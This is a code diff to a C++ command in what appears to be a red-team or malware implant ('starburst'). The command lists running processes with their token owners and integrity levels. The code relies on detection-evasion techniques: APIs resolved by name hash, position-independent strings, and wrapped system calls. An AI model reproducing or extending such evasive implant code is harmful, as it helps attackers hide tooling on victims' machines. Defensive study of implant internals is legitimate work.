@@ -64,6 +64,25 @@ auto declfn starburst::cmd_token_list(
         "PID\tUser\tIntegrity\tProcess\n" ) ) );
     uint32_t out_offset = str_len( output );
 
+    // resolve integrity helpers once before the loop
+    typedef PUCHAR ( WINAPI *fn_GetSidSubAuthorityCount )( PSID );
+    typedef PDWORD ( WINAPI *fn_GetSidSubAuthority )( PSID, DWORD );
+    auto pGSSAC = reinterpret_cast<fn_GetSidSubAuthorityCount>(
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
+            expr::hash_string( "GetSidSubAuthorityCount" ) ) );
+    auto pGSSA = reinterpret_cast<fn_GetSidSubAuthority>(
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
+            expr::hash_string( "GetSidSubAuthority" ) ) );
+
+    // pre-resolve integrity label strings for PIC
+    auto str_system    = symbol<char*>( const_cast<char*>( "System" ) );
+    auto str_high      = symbol<char*>( const_cast<char*>( "High" ) );
+    auto str_medium    = symbol<char*>( const_cast<char*>( "Medium" ) );
+    auto str_low       = symbol<char*>( const_cast<char*>( "Low" ) );
+    auto str_untrusted = symbol<char*>( const_cast<char*>( "Untrusted" ) );
+
     auto spi = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>( buf );
     while ( true ) {
         DWORD pid = (DWORD)(uintptr_t)spi->UniqueProcessId;
@@ -105,20 +124,16 @@ auto declfn starburst::cmd_token_list(
                     if ( SCALL( inst, advapi32.GetTokenInformation,
                             h_token, TokenIntegrityLevel, il_buf, sizeof(il_buf), &ret_len ) ) {
                         auto tml = reinterpret_cast<TOKEN_MANDATORY_LABEL*>( il_buf );
-                        typedef PUCHAR ( WINAPI *fn_GetSidSubAuthorityCount )( PSID );
-                        typedef PDWORD ( WINAPI *fn_GetSidSubAuthority )( PSID, DWORD );
-                        auto pGSSAC = reinterpret_cast<fn_GetSidSubAuthorityCount>(
-                            resolve::_api(
-                                reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
-                                expr::hash_string( "GetSidSubAuthorityCount" ) ) );
-                        auto pGSSA = reinterpret_cast<fn_GetSidSubAuthority>(
-                            resolve::_api(
-                                reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
-                                expr::hash_string( "GetSidSubAuthority" ) ) );
-                        if ( pGSSAC && pGSSA ) {
-                            auto sub_count = *(PUCHAR)SCALL_PTR( inst, pGSSAC, tml->Label.Sid );
-                            if ( sub_count > 0 ) {
-                                integrity = *(PDWORD)SCALL_PTR( inst, pGSSA, tml->Label.Sid, sub_count - 1 );
+                        if ( pGSSAC && pGSSA && tml->Label.Sid ) {
+                            auto count_ptr = (PUCHAR)SCALL_PTR( inst, pGSSAC, tml->Label.Sid );
+                            if ( count_ptr ) {
+                                auto sub_count = *count_ptr;
+                                if ( sub_count > 0 ) {
+                                    auto sa_ptr = (PDWORD)SCALL_PTR( inst, pGSSA, tml->Label.Sid, (DWORD)(sub_count - 1) );
+                                    if ( sa_ptr ) {
+                                        integrity = *sa_ptr;
+                                    }
+                                }
                             }
                         }
                     }
@@ -147,15 +162,14 @@ auto declfn starburst::cmd_token_list(
                 output[out_offset++] = '\t';
 
                 // integrity label
-                char* il_str;
-                if ( integrity >= 0x4000 ) il_str = const_cast<char*>( "System" );
-                else if ( integrity >= 0x3000 ) il_str = const_cast<char*>( "High" );
-                else if ( integrity >= 0x2000 ) il_str = const_cast<char*>( "Medium" );
-                else if ( integrity >= 0x1000 ) il_str = const_cast<char*>( "Low" );
-                else il_str = const_cast<char*>( "Untrusted" );
-                auto il_sym = symbol<char*>( il_str );
-                uint32_t ilen = str_len( il_sym );
-                memory::copy( output + out_offset, il_sym, ilen );
+                char* il_label;
+                if ( integrity >= 0x4000 ) il_label = str_system;
+                else if ( integrity >= 0x3000 ) il_label = str_high;
+                else if ( integrity >= 0x2000 ) il_label = str_medium;
+                else if ( integrity >= 0x1000 ) il_label = str_low;
+                else il_label = str_untrusted;
+                uint32_t ilen = str_len( il_label );
+                memory::copy( output + out_offset, il_label, ilen );
                 out_offset += ilen;
                 output[out_offset++] = '\t';
 
